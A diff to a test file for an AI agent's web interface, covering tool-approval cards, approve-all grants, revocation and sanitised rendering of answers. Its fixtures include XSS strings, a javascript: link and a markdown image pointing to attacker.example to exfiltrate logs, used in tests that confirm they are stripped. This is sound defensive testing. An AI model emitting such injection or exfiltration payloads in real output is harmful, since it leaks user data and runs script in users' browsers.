@@ -1,4 +1,4 @@
-import { fireEvent, render, screen, waitFor } from '@testing-library/react';
+import { act, fireEvent, render, screen, waitFor } from '@testing-library/react';
 import { MemoryRouter, Route, Routes } from 'react-router-dom';
 import { beforeEach, describe, expect, it, vi } from 'vitest';
 
@@ -34,6 +34,56 @@ const sse = (events: Array<[string, unknown]>) => {
   } as unknown as Response;
 };
 
+const approvalStream = (signal?: AbortSignal) => {
+  const encoder = new TextEncoder();
+  let streamController: ReadableStreamDefaultController<Uint8Array>;
+  const body = new ReadableStream<Uint8Array>({
+    start(controller) {
+      streamController = controller;
+      controller.enqueue(
+        encoder.encode(
+          `event: approval_required\ndata: ${JSON.stringify({ id: 'secret-capability', tool: 'mcp__remote__write', input: { path: '/tmp/target', content: '<script>alert(1)</script>' }, reason: 'Writes an external file' })}\n\n`
+        )
+      );
+    },
+  });
+  signal?.addEventListener('abort', () =>
+    streamController.error(new DOMException('Aborted', 'AbortError'))
+  );
+  return {
+    response: {
+      ok: true,
+      status: 200,
+      headers: new Headers({ 'content-type': 'text/event-stream' }),
+      body,
+    } as Response,
+    finish: () => {
+      streamController.enqueue(
+        encoder.encode('event: done\ndata: {"answer":"Finished safely.","steps":[]}\n\n')
+      );
+      streamController.close();
+    },
+  };
+};
+
+const waitingStream = (signal?: AbortSignal) => {
+  let controller: ReadableStreamDefaultController<Uint8Array>;
+  const body = new ReadableStream<Uint8Array>({
+    start(value) {
+      controller = value;
+    },
+  });
+  signal?.addEventListener('abort', () =>
+    controller.error(new DOMException('Aborted', 'AbortError'))
+  );
+  return {
+    ok: true,
+    status: 200,
+    headers: new Headers({ 'content-type': 'text/event-stream' }),
+    body,
+  } as Response;
+};
+
 const renderPage = () =>
   render(
     <MemoryRouter>
@@ -48,7 +98,13 @@ const ask = (text: string) => {
 
 beforeEach(() => {
   localStorage.clear();
-  useAgentStore.setState({ sessions: [], activeId: null, viewStepId: null });
+  useAgentStore.setState({
+    sessions: [],
+    activeId: null,
+    viewStepId: null,
+    approvedInvestigations: {},
+    grantRevisions: {},
+  });
   vi.stubGlobal('fetch', vi.fn());
 });
 
@@ -182,7 +238,7 @@ describe('Agent', () => {
             'done',
             {
               answer:
-                '## Findings\n\n- **Auth** failed\n\n<script>alert(1)</script>\n\n[bad](javascript:alert(1))',
+                '## Findings\n\n- **Auth** failed\n\n<script>alert(1)</script>\n\n[bad](javascript:alert(1))\n\n![secret](https://attacker.example/collect?logs=secret)\n\n[safe](https://example.com)',
               steps: [],
             },
           ],
@@ -194,7 +250,284 @@ describe('Agent', () => {
     await screen.findByRole('heading', { name: 'Findings' });
     expect(screen.getByText('Auth').tagName).toBe('STRONG');
     expect(container.querySelector('script')).toBeNull();
+    expect(container.querySelector('img')).toBeNull();
     expect(container.innerHTML).not.toContain('href="javascript:');
+    expect(screen.getByRole('link', { name: 'safe' }).getAttribute('rel')).toBe(
+      'noreferrer noopener'
+    );
+  });
+
+  it.each([true, false])('submits an approval decision once (approve=%s)', async (approve) => {
+    const fetchMock = vi.mocked(fetch);
+    let live: ReturnType<typeof approvalStream>;
+    fetchMock.mockResolvedValueOnce(json({ available: true }));
+    fetchMock.mockImplementationOnce((_url, options) => {
+      live = approvalStream(options?.signal || undefined);
+      return Promise.resolve(live.response);
+    });
+    fetchMock.mockResolvedValueOnce(json({ status: approve ? 'approved' : 'denied' }));
+    fetchMock.mockResolvedValueOnce(json({ available: true }));
+    renderPage();
+    await screen.findByText('Ready');
+    ask('Write report');
+    const card = await screen.findByRole('region', { name: 'Tool approval required' });
+    expect(card.textContent).toContain('mcp__remote__write');
+    expect(card.textContent).toContain('"path": "/tmp/target"');
+    expect(card.querySelector('script')).toBeNull();
+    expect(localStorage.getItem('logsonic-agent')).not.toContain('secret-capability');
+    const button = screen.getByRole('button', { name: approve ? 'Approve once' : 'Deny' });
+    fireEvent.click(button);
+    fireEvent.click(button);
+    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(3));
+    const [url, options] = fetchMock.mock.calls[2];
+    expect(url).toContain('/agent/approve');
+    expect(JSON.parse(String(options?.body))).toEqual({ id: 'secret-capability', approve });
+    live!.finish();
+    await screen.findByText('Finished safely.');
+    expect(screen.queryByRole('region', { name: 'Tool approval required' })).toBeNull();
+    expect(localStorage.getItem('logsonic-agent')).not.toContain('secret-capability');
+  });
+
+  it('keeps the decision visible after submission failure and clears it on stop', async () => {
+    const fetchMock = vi.mocked(fetch);
+    fetchMock.mockResolvedValueOnce(json({ available: true }));
+    fetchMock.mockImplementationOnce((_url, options) =>
+      Promise.resolve(approvalStream(options?.signal || undefined).response)
+    );
+    fetchMock.mockResolvedValueOnce(json({ error: 'expired' }, 404));
+    renderPage();
+    await screen.findByText('Ready');
+    ask('Write report');
+    await screen.findByRole('region', { name: 'Tool approval required' });
+    fireEvent.click(screen.getByRole('button', { name: 'Approve once' }));
+    await screen.findByText(/expired/);
+    expect(screen.getByRole('region', { name: 'Tool approval required' })).toBeTruthy();
+    fireEvent.click(screen.getByRole('button', { name: 'Stop' }));
+    await screen.findByText('Stopped.');
+    expect(screen.queryByRole('region', { name: 'Tool approval required' })).toBeNull();
+  });
+
+  it('locks history while a stream awaits approval so a second run cannot replace it', async () => {
+    const now = Date.now();
+    useAgentStore.setState({
+      sessions: [
+        {
+          id: 'older',
+          title: 'Earlier question',
+          createdAt: now,
+          updatedAt: now,
+          turns: [
+            {
+              user: 'Earlier question',
+              items: [],
+              answer: 'Earlier answer',
+              pending: false,
+              startedAt: now,
+              finishedAt: now,
+            },
+          ],
+        },
+      ],
+      activeId: null,
+    });
+    const fetchMock = vi.mocked(fetch);
+    fetchMock.mockResolvedValueOnce(json({ available: true }));
+    fetchMock.mockImplementationOnce((_url, options) =>
+      Promise.resolve(approvalStream(options?.signal || undefined).response)
+    );
+    fetchMock.mockResolvedValueOnce(json({ available: true }));
+    renderPage();
+    await screen.findByText('Ready');
+    ask('Current question');
+    await screen.findByRole('region', { name: 'Tool approval required' });
+    fireEvent.click(screen.getByRole('button', { name: 'Past investigations' }));
+    const old = screen.getByRole('button', { name: /^Earlier question/ });
+    expect((old as HTMLButtonElement).disabled).toBe(true);
+    expect(
+      (screen.getByRole('button', { name: 'Delete Earlier question' }) as HTMLButtonElement)
+        .disabled
+    ).toBe(true);
+    fireEvent.click(old);
+    expect(useAgentStore.getState().activeId).not.toBe('older');
+    fireEvent.click(screen.getByRole('button', { name: 'Past investigations' }));
+    expect(
+      (screen.getByRole('button', { name: 'New investigation' }) as HTMLButtonElement).disabled
+    ).toBe(true);
+    fireEvent.click(screen.getByRole('button', { name: 'Stop' }));
+    await screen.findByText('Stopped.');
+    expect(screen.queryByRole('region', { name: 'Tool approval required' })).toBeNull();
+    expect(
+      fetchMock.mock.calls.filter(([url]) => String(url).includes('/agent/chat'))
+    ).toHaveLength(1);
+  });
+
+  it('grants all tools only to this investigation and sends the grant on later turns', async () => {
+    const fetchMock = vi.mocked(fetch);
+    let first: ReturnType<typeof approvalStream>;
+    let chats = 0;
+    fetchMock.mockImplementation((url, options) => {
+      if (String(url).endsWith('/agent/status')) return Promise.resolve(json({ available: true }));
+      if (String(url).endsWith('/agent/approve'))
+        return Promise.resolve(json({ status: 'approved' }));
+      if (String(url).endsWith('/agent/chat')) {
+        chats++;
+        if (chats === 1) {
+          first = approvalStream(options?.signal || undefined);
+          return Promise.resolve(first.response);
+        }
+        return Promise.resolve(sse([['done', { answer: `Answer ${chats}`, steps: [] }]]));
+      }
+      throw new Error(`Unexpected fetch: ${String(url)}`);
+    });
+    const { unmount } = renderPage();
+    await screen.findByText('Ready');
+    ask('Original investigation');
+    await screen.findByRole('region', { name: 'Tool approval required' });
+    fireEvent.click(screen.getByRole('button', { name: 'Approve all for this investigation' }));
+    await waitFor(() =>
+      expect(fetchMock.mock.calls.some(([url]) => String(url).endsWith('/agent/approve'))).toBe(
+        true
+      )
+    );
+    const approvalCall = fetchMock.mock.calls.find(([url]) =>
+      String(url).endsWith('/agent/approve')
+    )!;
+    expect(JSON.parse(String(approvalCall[1]?.body))).toEqual({
+      id: 'secret-capability',
+      approve: true,
+      approve_all: true,
+    });
+    first!.finish();
+    await screen.findByText('Finished safely.');
+    expect(screen.getByText('All tools approved for this investigation')).toBeTruthy();
+    expect(localStorage.getItem('logsonic-agent')).not.toContain('approvedInvestigations');
+    expect(localStorage.getItem('logsonic-agent')).not.toContain('approve_all');
+    unmount();
+    renderPage();
+    await screen.findByText('All tools approved for this investigation');
+    ask('Follow up');
+    await screen.findByText('Answer 2');
+    const chatCalls = fetchMock.mock.calls.filter(([url]) => String(url).endsWith('/agent/chat'));
+    expect(JSON.parse(String(chatCalls[1][1]?.body)).approve_all).toBe(true);
+    fireEvent.click(screen.getByRole('button', { name: 'New investigation' }));
+    ask('Separate investigation');
+    await screen.findByText('Answer 3');
+    const laterChats = fetchMock.mock.calls.filter(([url]) => String(url).endsWith('/agent/chat'));
+    expect(JSON.parse(String(laterChats[2][1]?.body)).approve_all).toBeUndefined();
+    expect(screen.queryByText('All tools approved for this investigation')).toBeNull();
+    fireEvent.click(screen.getByRole('button', { name: 'Past investigations' }));
+    fireEvent.click(screen.getByRole('button', { name: /^Original investigation/ }));
+    expect(screen.getByText('All tools approved for this investigation')).toBeTruthy();
+  });
+
+  it('revokes all-tool approval and aborts an in-flight stream', async () => {
+    const fetchMock = vi.mocked(fetch);
+    let first: ReturnType<typeof approvalStream>;
+    let chats = 0;
+    fetchMock.mockImplementation((url, options) => {
+      if (String(url).endsWith('/agent/status')) return Promise.resolve(json({ available: true }));
+      if (String(url).endsWith('/agent/approve'))
+        return Promise.resolve(json({ status: 'approved' }));
+      if (String(url).endsWith('/agent/chat')) {
+        chats++;
+        if (chats === 1) {
+          first = approvalStream(options?.signal || undefined);
+          return Promise.resolve(first.response);
+        }
+        if (chats === 2) return Promise.resolve(waitingStream(options?.signal || undefined));
+        return Promise.resolve(sse([['done', { answer: 'After revocation', steps: [] }]]));
+      }
+      throw new Error(`Unexpected fetch: ${String(url)}`);
+    });
+    renderPage();
+    await screen.findByText('Ready');
+    ask('Investigate');
+    await screen.findByRole('region', { name: 'Tool approval required' });
+    fireEvent.click(screen.getByRole('button', { name: 'Approve all for this investigation' }));
+    await screen.findByText('All tools approved for this investigation');
+    first!.finish();
+    await screen.findByText('Finished safely.');
+    ask('Long operation');
+    await waitFor(() => expect(chats).toBe(2));
+    fireEvent.click(screen.getByRole('button', { name: 'Require approvals' }));
+    await screen.findByText('Stopped.');
+    expect(screen.queryByText('All tools approved for this investigation')).toBeNull();
+    ask('Next operation');
+    await screen.findByText('After revocation');
+    const chatCalls = fetchMock.mock.calls.filter(([url]) => String(url).endsWith('/agent/chat'));
+    expect(JSON.parse(String(chatCalls[1][1]?.body)).approve_all).toBe(true);
+    expect(JSON.parse(String(chatCalls[2][1]?.body)).approve_all).toBeUndefined();
+  });
+
+  it('keeps an approve-all decision when its successful POST returns after the stream ends', async () => {
+    const fetchMock = vi.mocked(fetch);
+    let first: ReturnType<typeof approvalStream>;
+    let resolveApproval!: (response: Response) => void;
+    fetchMock.mockImplementation((url, options) => {
+      if (String(url).endsWith('/agent/status')) return Promise.resolve(json({ available: true }));
+      if (String(url).endsWith('/agent/chat')) {
+        first = approvalStream(options?.signal || undefined);
+        return Promise.resolve(first.response);
+      }
+      if (String(url).endsWith('/agent/approve'))
+        return new Promise<Response>((resolve) => {
+          resolveApproval = resolve;
+        });
+      throw new Error(`Unexpected fetch: ${String(url)}`);
+    });
+    renderPage();
+    await screen.findByText('Ready');
+    ask('Investigate');
+    await screen.findByRole('region', { name: 'Tool approval required' });
+    fireEvent.click(screen.getByRole('button', { name: 'Approve all for this investigation' }));
+    first!.finish();
+    await screen.findByText('Finished safely.');
+    resolveApproval(json({ status: 'approved' }));
+    await screen.findByText('All tools approved for this investigation');
+  });
+
+  it('does not restore an all-tools grant from localStorage on rehydrate', async () => {
+    localStorage.setItem(
+      'logsonic-agent',
+      JSON.stringify({
+        state: { approvedInvestigations: { forged: true } },
+        version: 1,
+      })
+    );
+    await useAgentStore.persist.rehydrate();
+    expect(useAgentStore.getState().approvedInvestigations).toEqual({});
+  });
+
+  it('does not restore a grant when a delayed approval response follows revocation', async () => {
+    const fetchMock = vi.mocked(fetch);
+    let first: ReturnType<typeof approvalStream>;
+    let resolveApproval!: (response: Response) => void;
+    fetchMock.mockImplementation((url, options) => {
+      if (String(url).endsWith('/agent/status')) return Promise.resolve(json({ available: true }));
+      if (String(url).endsWith('/agent/chat')) {
+        first = approvalStream(options?.signal || undefined);
+        return Promise.resolve(first.response);
+      }
+      if (String(url).endsWith('/agent/approve'))
+        return new Promise<Response>((resolve) => {
+          resolveApproval = resolve;
+        });
+      throw new Error(`Unexpected fetch: ${String(url)}`);
+    });
+    const { unmount } = renderPage();
+    await screen.findByText('Ready');
+    ask('Investigate');
+    await screen.findByRole('region', { name: 'Tool approval required' });
+    fireEvent.click(screen.getByRole('button', { name: 'Approve all for this investigation' }));
+    first!.finish();
+    await screen.findByText('Finished safely.');
+    const id = useAgentStore.getState().activeId!;
+    unmount();
+    renderPage();
+    act(() => useAgentStore.getState().grantInvestigation(id));
+    fireEvent.click(await screen.findByRole('button', { name: 'Require approvals' }));
+    await act(async () => resolveApproval(json({ status: 'approved' })));
+    expect(useAgentStore.getState().approvedInvestigations[id]).toBeUndefined();
   });
 
   it('stops a running request and permits retry', async () => {
